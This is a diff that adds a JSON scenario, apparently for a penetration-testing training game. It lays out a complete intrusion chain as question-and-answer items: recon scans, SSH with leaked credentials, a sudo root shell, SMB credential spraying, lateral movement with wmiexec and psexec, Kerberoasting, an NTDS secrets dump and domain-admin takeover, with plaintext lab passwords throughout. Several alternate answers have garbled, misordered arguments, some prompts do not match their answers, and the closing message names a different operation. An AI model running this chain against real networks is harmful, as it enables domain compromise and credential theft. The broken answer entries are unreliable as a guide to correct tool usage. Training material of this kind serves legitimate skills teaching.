@@ -1,0 +1,375 @@
+{
+    "id":  "shadowed_anvil_001",
+    "name":  "Shadowed Anvil",
+    "description":  "Long linear operation: recon, foothold, privilege escalation, multi-host lateral movement, and AD objective.",
+    "steps":  [
+                  {
+                      "question":  [
+                                       "Recon: Begin external service profiling before any auth attempts. Use nmap with service version detection, default NSE scripts, and skip host discovery; treat target as online.",
+                                       "Target IP: 10.10.20.15",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "nmap -sV -sC -Pn 10.10.20.15",
+                      "alternate_answers":  [
+                                                "nmap 10.10.20.15 -sV -sC -Pn"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Focus web ports and enumerate HTTP content quickly. Use nmap.",
+                                       "Target IP: 10.10.20.15",
+                                       "Scan only 80 and 443 with http-enum and http-title."
+                                   ],
+                      "answer":  "nmap -p80,443 --script=http-enum,http-title 10.10.20.15",
+                      "alternate_answers":  [
+                                                "nmap -p 80,443 --script=http-enum,http-title 10.10.20.15",
+                                                "nmap -p80,443 --script http-enum,http-title 10.10.20.15",
+                                                "nmap 10.10.20.15 -p80,443 --script=http-enum,http-title"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate web paths from the main portal. Use ffuf with set wordlist and match specific HTTP status codes.",
+                                       "URL: http://10.10.20.15/FUZZ",
+                                       "Wordlist: /usr/share/wordlists/dirb/common.txt",
+                                       "Match status codes: 200,204,301,302,307,401,403"
+                                   ],
+                      "answer":  "ffuf -u http://10.10.20.15/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403",
+                      "alternate_answers":  [
+                                                "ffuf 200,204,301,302,307,401,403 -u http://10.10.20.15/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Run a quick web vulnerability check for common exposures. Use nikto.",
+                                       "Target: http://10.10.20.15"
+                                   ],
+                      "answer":  "nikto -h http://10.10.20.15",
+                      "alternate_answers":  [
+                                                "nikto http://10.10.20.15 -h"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Suspected source control leak found. Verify repository metadata. Use curl.",
+                                       "Fetch .git config from target web root."
+                                   ],
+                      "answer":  "curl -s http://10.10.20.15/.git/config",
+                      "alternate_answers":  [
+                                                "curl http://10.10.20.15/.git/config -s"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Credentials recovered for initial Linux access.",
+                                       "Host: 10.10.20.15",
+                                       "User: devops",
+                                       "Connect over SSH."
+                                   ],
+                      "answer":  "ssh devops@10.10.20.15",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Initial foothold established."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "shadowed_anvil_001",
+                                                                "ip":  "10.10.20.15",
+                                                                "hostname":  "web-edge-15",
+                                                                "username":  "devops",
+                                                                "mac_address":  "00:50:56:10:20:15"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Confirm current execution context on foothold host. Use whoami.",
+                                       "Run identity check."
+                                   ],
+                      "answer":  "whoami"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Identify sudo rights and possible escalation paths.",
+                                       "List current sudo privileges."
+                                   ],
+                      "answer":  "sudo -l"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate SUID binaries for escalation opportunities. Use find with match permission bits and restrict object type.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "find / -perm -4000 -type f 2\u003e/dev/null"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Backup location likely contains deployment credentials.",
+                                       "Read file: /opt/backups/deploy.creds"
+                                   ],
+                      "answer":  "cat /opt/backups/deploy.creds"
+                  },
+                  {
+                      "question":  [
+                                       "PrivEsc: Sudo misconfiguration allows root shell execution.",
+                                       "Spawn root shell using allowed bash path."
+                                   ],
+                      "answer":  "sudo -u root /usr/bin/bash"
+                  },
+                  {
+                      "question":  [
+                                       "PrivEsc: Validate elevated privileges after escalation.",
+                                       "Show uid/gid context."
+                                   ],
+                      "answer":  "id",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Privilege escalation successful on web-edge-15."
+                                                      ],
+                                         "beacon_update":  [
+                                                               {
+                                                                   "id":  "shadowed_anvil_001",
+                                                                   "ip":  "10.10.20.15",
+                                                                   "hostname":  "web-edge-15",
+                                                                   "username":  "root",
+                                                                   "mac_address":  "00:50:56:10:20:15"
+                                                               }
+                                                           ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Determine internal interfaces and reachable internal range. Use ip.",
+                                       "Display interface configuration."
+                                   ],
+                      "answer":  "ip a"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Identify live hosts on discovered internal segment. Use nmap with host discovery (ping scan.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "nmap -sn 10.10.30.0/24",
+                      "alternate_answers":  [
+                                                "nmap 10.10.30.0/24 -sn"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: You recovered domain service credentials from deploy files.",
+                                       "Domain: EVILCORP.LOCAL",
+                                       "User: svc.deploy",
+                                       "Password: Spring2026!",
+                                       "Enumerate SMB auth success across 10.10.30.0/24 using crackmapexec."
+                                   ],
+                      "answer":  "crackmapexec smb 10.10.30.0/24 -u svc.deploy -p Spring2026! -d EVILCORP.LOCAL",
+                      "alternate_answers":  [
+                                                "crackmapexec smb 10.10.30.0/24 -u svc.deploy -pSpring2026! -d EVILCORP.LOCAL",
+                                                "crackmapexec EVILCORP.LOCAL smb 10.10.30.0/24 -u svc.deploy -p Spring2026! -d"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Workstation 10.10.30.25 allows remote execution for svc.deploy.",
+                                       "Execute whoami with wmiexec.py."
+                                   ],
+                      "answer":  "wmiexec.py EVILCORP.LOCAL/svc.deploy:Spring2026!@10.10.30.25 whoami",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec EVILCORP.LOCAL/svc.deploy:Spring2026!@10.10.30.25 whoami",
+                                                "wmiexec.py whoami EVILCORP.LOCAL/svc.deploy:Spring2026!@10.10.30.25"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Lateral foothold acquired on workstation."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "shadowed_anvil_001",
+                                                                "ip":  "10.10.30.25",
+                                                                "hostname":  "ws-acct-25",
+                                                                "username":  "EVILCORP\\svc.deploy",
+                                                                "mac_address":  "00:50:56:10:30:25"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Collect host baseline from workstation foothold.",
+                                       "Run systeminfo."
+                                   ],
+                      "answer":  "systeminfo"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Check admin group memberships for local privilege context. Use net.",
+                                       "Enumerate local administrators."
+                                   ],
+                      "answer":  "net localgroup administrators"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Search stored credentials that can support next pivot. Use cmdkey.",
+                                       "List saved credentials."
+                                   ],
+                      "answer":  "cmdkey /list"
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Saved credential grants admin access to app server.",
+                                       "Target: 10.10.30.35",
+                                       "User: EVILCORP.LOCAL/ops-admin",
+                                       "Password: BuildServer!2026",
+                                       "Run whoami via psexec.py."
+                                   ],
+                      "answer":  "psexec.py EVILCORP.LOCAL/ops-admin:BuildServer!2026@10.10.30.35 whoami",
+                      "alternate_answers":  [
+                                                "impacket-psexec EVILCORP.LOCAL/ops-admin:BuildServer!2026@10.10.30.35 whoami",
+                                                "psexec.py whoami EVILCORP.LOCAL/ops-admin:BuildServer!2026@10.10.30.35"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "App server pivot successful."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "shadowed_anvil_001",
+                                                                "ip":  "10.10.30.35",
+                                                                "hostname":  "app-core-35",
+                                                                "username":  "EVILCORP\\ops-admin",
+                                                                "mac_address":  "00:50:56:10:30:35"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate service accounts on app server for escalation and pivoting.",
+                                       "Use WMIC to list service name, account, and state."
+                                   ],
+                      "answer":  "wmic service get Name,StartName,State"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Confirm token privileges of current context on app server.",
+                                       "Run whoami privileges view."
+                                   ],
+                      "answer":  "whoami /priv"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: SQL host discovered from application config. Validate share access. Ensure behavior includes list remote resources.",
+                                       "Target: 10.10.30.45",
+                                       "User: EVILCORP.LOCAL/ops-admin",
+                                       "Password: BuildServer!2026",
+                                       "List SMB shares using smbclient.py."
+                                   ],
+                      "answer":  "smbclient.py EVILCORP.LOCAL/ops-admin:BuildServer!2026@10.10.30.45 -list",
+                      "alternate_answers":  [
+                                                "impacket-smbclient EVILCORP.LOCAL/ops-admin:BuildServer!2026@10.10.30.45 -list"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: SQL service credential identified in scheduled task.",
+                                       "Target: 10.10.30.45",
+                                       "User: EVILCORP.LOCAL/sqlsvc",
+                                       "Password: SqlBackup!2026",
+                                       "Run whoami using wmiexec.py."
+                                   ],
+                      "answer":  "wmiexec.py EVILCORP.LOCAL/sqlsvc:SqlBackup!2026@10.10.30.45 whoami",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec EVILCORP.LOCAL/sqlsvc:SqlBackup!2026@10.10.30.45 whoami",
+                                                "wmiexec.py whoami EVILCORP.LOCAL/sqlsvc:SqlBackup!2026@10.10.30.45"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "SQL host access established. Workstation beacon retired."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "b02"
+                                                           ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "shadowed_anvil_001",
+                                                                "ip":  "10.10.30.45",
+                                                                "hostname":  "sql-warehouse-45",
+                                                                "username":  "EVILCORP\\sqlsvc",
+                                                                "mac_address":  "00:50:56:10:30:45"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate SPNs to identify privileged service accounts. Ensure behavior includes set domain controller and request tickets/data.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "GetUserSPNs.py EVILCORP.LOCAL/sqlsvc:SqlBackup!2026 -dc-ip 10.10.30.10 -request"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Domain reconnaissance is needed before final pivot. Ensure behavior includes set wordlist.",
+                                       "Run ldapsearch for user objects.",
+                                       "Server: ldap://10.10.30.10",
+                                       "Bind user: EVILCORP.LOCAL\\\\backup-admin",
+                                       "Password: BackupAdmin!2026",
+                                       "Base DN: DC=EVILCORP,DC=LOCAL"
+                                   ],
+                      "answer":  "ldapsearch -x -H ldap://10.10.30.10 -D \"EVILCORP.LOCAL\\\\backup-admin\" -w \"BackupAdmin!2026\" -b \"DC=EVILCORP,DC=LOCAL\" \"(objectClass=user)\" sAMAccountName"
+                  },
+                  {
+                      "question":  [
+                                       "PrivEsc/Domain Escalation: backup-admin credentials grant registry/NTDS extraction rights.",
+                                       "Target DC: 10.10.30.10",
+                                       "Run secretsdump.py with backup-admin."
+                                   ],
+                      "answer":  "secretsdump.py EVILCORP.LOCAL/backup-admin:BackupAdmin!2026@10.10.30.10"
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Domain Administrator password recovered from dump output.",
+                                       "Target DC: 10.10.30.10",
+                                       "User: EVILCORP.LOCAL/Administrator",
+                                       "Password: P@ssw0rd-DA!",
+                                       "Run whoami via psexec.py."
+                                   ],
+                      "answer":  "psexec.py EVILCORP.LOCAL/Administrator:P@ssw0rd-DA!@10.10.30.10 whoami",
+                      "alternate_answers":  [
+                                                "impacket-psexec EVILCORP.LOCAL/Administrator:P@ssw0rd-DA!@10.10.30.10 whoami",
+                                                "psexec.py whoami EVILCORP.LOCAL/Administrator:P@ssw0rd-DA!@10.10.30.10"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Domain controller control achieved."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "b03",
+                                                               "b04"
+                                                           ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "shadowed_anvil_001",
+                                                                "ip":  "10.10.30.10",
+                                                                "hostname":  "dc01",
+                                                                "username":  "EVILCORP\\Administrator",
+                                                                "mac_address":  "00:50:56:10:30:10"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Objective: Collect final proof from Domain Controller desktop. Use type.",
+                                       "Read file C:\\\\Users\\\\Administrator\\\\Desktop\\\\proof.txt"
+                                   ],
+                      "answer":  "type C:\\Users\\Administrator\\Desktop\\proof.txt",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Operation Deadfall complete."
+                                                      ]
+                                     }
+                  }
+              ]
+}
